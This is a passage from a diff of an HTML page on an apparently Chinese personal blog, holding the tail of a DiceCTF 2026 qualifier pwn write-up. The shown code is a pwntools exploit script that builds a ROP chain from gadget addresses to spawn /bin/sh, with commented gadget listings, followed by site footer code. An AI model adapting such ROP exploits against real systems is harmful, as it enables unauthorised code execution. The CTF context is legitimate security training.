+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">myexit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pop_rdi_pop_rbp_xor_eax_eax_ret</span> <span class="o">=</span> <span class="mh">0x2a1345</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x243431</span>
+</span></span><span class="line"><span class="cl">	<span class="n">mov_rdx_rsi_add_rsp_0x80_pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x27146b</span>
+</span></span><span class="line"><span class="cl">	<span class="n">mov_rax_rbx_pop_rbx_ret</span> <span class="o">=</span> <span class="mh">0x24577a</span>
+</span></span><span class="line"><span class="cl">	<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x2a6602</span>
+</span></span><span class="line"><span class="cl">	<span class="n">xchg_rsp_rax_ret</span> <span class="o">=</span> <span class="mh">0x242d78</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x2F9FD0</span>
+</span></span><span class="line"><span class="cl">	<span class="n">buffer</span> <span class="o">=</span> <span class="mh">0x2F9E38</span>
+</span></span><span class="line"><span class="cl">	<span class="n">funclist</span> <span class="o">=</span> <span class="mh">0x2F08E8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">rop_chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">		<span class="n">pop_rdi_pop_rbp_xor_eax_eax_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">bin_sh</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">pop_rsi_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">mov_rdx_rsi_add_rsp_0x80_pop_rbp_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x11</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">mov_rax_rbx_pop_rbx_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">59</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">mov_rax_rbx_pop_rbx_ret</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="mi">59</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">syscall</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">xchg_rsp_rax_ret</span>
+</span></span><span class="line"><span class="cl">	<span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">		<span class="mh">0x0</span><span class="p">:</span> <span class="n">rop_chain</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">bin_sh</span> <span class="o">-</span> <span class="n">buffer</span><span class="p">:</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">},</span> <span class="n">filler</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">send_message</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">send_message_color</span><span class="p">((</span><span class="n">buffer</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop_chain</span><span class="p">)</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">funclist</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">print_message</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">attack</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># .data.rel.ro:00000000002F08E8 funcs_243A92    dq offset _RNvYReNtCscVAelyVn9lu_7colored8Colorize3redB6_</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .bss:00000000002F9E38 ; challenge::BUFFER</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x00000000002a1345: pop rdi; pop rbp; xor eax, eax; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0000000000243431: pop rsi; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000027146b: mov rdx, rsi; add rsp, 0x80; pop rbp; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000024577a: mov rax, rbx; pop rbx; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x00000000002a6602: syscall;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0000000000242d78: xchg rsp, rax; ret;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># rdi-&gt;0x2F9FD0-&gt;/bin/sh\x00</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># rsi-&gt;0</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># rdx-&gt;0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/dicectf2026quals/">DiceCTF2026Quals</a>
+        
+            <a href="/tags/writeup/">WriteUp</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright inline-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        const elementsToRender = [".main-article", ".widget--toc"];
+
+        elementsToRender.forEach(selector => {
+            const element = document.querySelector(selector);
+            if (element) {
+                renderMathInElement(element, {
+                    delimiters: [
+                        { left: "$$", right: "$$", display: true },
+                        { left: "$", right: "$", display: false },
+                        { left: "\\(", right: "\\)", display: false },
+                        { left: "\\[", right: "\\]", display: true }
+                    ],
+                    ignoredClasses: ["gist"]
+                });
+            }
+        });
+    });
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside>
+    <h2 class="section-title">相关文章</h2>
+    <div class="subsection-list">
+        <div class="article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/ccsssc-2026-%E9%A2%98%E8%A7%A3/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CCSSSC-2026 题解</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/lactf2026-pwn-%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">LACTF2026-pwn 个人题解</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/hgame2026-pwn-writeup/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HGAME2026-pwn WriteUp</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/n1junior2026-pwn-writeup/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1Junior2026-pwn WriteUp</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/isctf2025-pwn-writeup/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ISCTF2025-pwn WriteUp</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 RatherHard の Blog
+    </section>
+    
+    <section class="running-time">
+        本博客已稳定运行
+        <span id="runningdays" class="running-days"></span>
+    </section>
+
+      
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        
+        发表了37篇文章 ·
+        总计64232字
+    </section>
+
+    <section class="powerby">
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.0">Stack</a></b> 设计自 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+
+    
+    <script>
+        let s1 = '2025-10-22'; 
+        s1 = new Date(s1.replace(/-/g, "/"));
+        let s2 = new Date();
+        let timeDifference = s2.getTime() - s1.getTime();
+
+        let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+        let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+        let result = days + "天" + hours + "小时" + minutes + "分钟";
+        document.getElementById('runningdays').innerHTML = result;
+    </script>
+</footer>
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.59ba6e968392675bcafff4a2c828b3703e83d5a36f35edf36e42a3770f93a4f9.js" defer></script>
+<div id="particles-js"></div>
+
+
+<script src='http://localhost:1313/background/particles.min.js'></script>
+<script>
+    particlesJS.load('particles-js', 'http:\/\/localhost:1313\/background\/particlesjs-config.json', function() {
+        console.log('particles.js loaded - callback');
+    });
+</script>
+
+<style>
+    #particles-js {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -1;
+    }
+</style>
+
+<style>
+    @font-face {
+        font-family: 'MapleMonoFont';
+        src: url(http://localhost:1313/font/MapleMono-NF-CN-Regular.woff2) format('woff2');
+    }
+
+    :root {
+        --base-font-family: 'MapleMonoFont';
+        --code-font-family: 'MapleMonoFont';
+    }
+</style>
+
+
+
+
+
+
+
+        <button id="back-to-top" class="back-to-top" type="button" aria-label="返回顶部">
+            <span class="back-to-top__progress" aria-hidden="true"></span>
+            <span class="back-to-top__inner" aria-hidden="true"></span>
+        </button>
+        <script>
+            const backToTopButton = document.getElementById('back-to-top');
+            function updateBackToTop() {
+                const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+                const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+                const progress = scrollHeight > 0 ? scrollTop / scrollHeight : 0;
+
+                backToTopButton.style.setProperty('--scroll-progress', progress.toFixed(4));
+
+                if (scrollTop > 110) {
+                    backToTopButton.style.display = 'inline-flex';
+                } else {
+                    backToTopButton.style.display = 'none';
+                }
+            }
+
+            window.addEventListener('scroll', updateBackToTop, { passive: true });
+            updateBackToTop();
+
+            backToTopButton.addEventListener('click', function () {
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        </script>
+    </body>
+</html>
